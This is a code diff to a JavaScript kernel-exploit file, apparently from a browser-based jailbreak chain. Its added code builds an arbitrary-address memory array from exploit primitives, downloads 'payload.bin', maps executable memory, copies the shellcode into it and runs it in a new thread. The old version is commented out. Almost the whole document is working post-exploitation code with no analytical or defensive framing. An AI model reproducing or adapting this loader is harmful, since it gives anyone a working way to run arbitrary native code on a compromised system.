@@ -1806,7 +1806,48 @@ export async function kexploit() {
 
 
 kexploit().then(() => {
-    const PROT_READ = 1;
+
+
+       
+function array_from_address(addr, size) {
+    var og_array = new Uint32Array(0x1000);
+    var og_array_i = mem.addrof(og_array).add(0x10);
+    mem.writep(og_array_i, addr);
+    mem.write4(og_array_i.add(0x8), size);
+    mem.write4(og_array_i.add(0xC), 0x1);
+    nogc.push(og_array);
+    return og_array;
+}
+    
+var req = new XMLHttpRequest();
+ req.responseType = "arraybuffer";
+ req.open('GET','payload.bin');
+ req.send();
+ req.onreadystatechange = function () {
+  if (req.readyState == 4) {
+   PLD = req.response;
+     var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+
+   var pl = array_from_address(payload_buffer, PLD.byteLength*4);
+   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+   tmp.set(new Uint8Array(req.response), 0);
+   tmp.set(padding, req.response.byteLength);
+   var shellcode = new Uint32Array(tmp.buffer);
+   pl.set(shellcode,0);
+   var pthread = malloc(0x10);
+   
+    call_nze(
+        'pthread_create',
+        pthread,
+        0,
+        payload_loader,
+        payload_buffer,
+    );	
+}
+ };
+   
+  /*  const PROT_READ = 1;
     const PROT_WRITE = 2;
     const PROT_EXEC = 4;
     var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
@@ -1823,5 +1864,5 @@ kexploit().then(() => {
         payload_loader.addr,
         payload_buffer,
     );
-
+*/
 })
